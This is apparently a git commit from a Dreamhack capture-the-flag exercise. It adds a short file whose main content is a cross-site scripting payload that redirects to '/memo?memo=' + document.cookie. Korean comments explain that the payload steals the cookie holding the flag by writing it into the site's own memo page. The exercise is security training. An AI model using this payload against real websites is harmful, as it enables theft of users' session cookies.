0699b55438d07a6ae99dfa82eed3ac3d70e0a35f
papalooo <68888789+papalooo@users.noreply.github.com>
2020-11-13 22:07:47 +0900

    dreamhack-xss
    In the input window of the flag appendix on the website
    When the above script is entered, the script is executed and the cookie value is recorded in the memo appendix of the site. The cookie value is the flag value

---
+++ xss/app.js
@@ -0,0 +1,9 @@
+<script>
+    location.href = '/memo?memo=' + document.cookie;
+</script>
+
+// 사이트의 flag 에서
+// 위 문장을 입력하면 
+// 해당 스크립트가 스크립트 문으로 실행되어
+// 사이트의 memo 에 쿠키 값을 기록한다.
+// 해당 쿠키 값이 flag 값
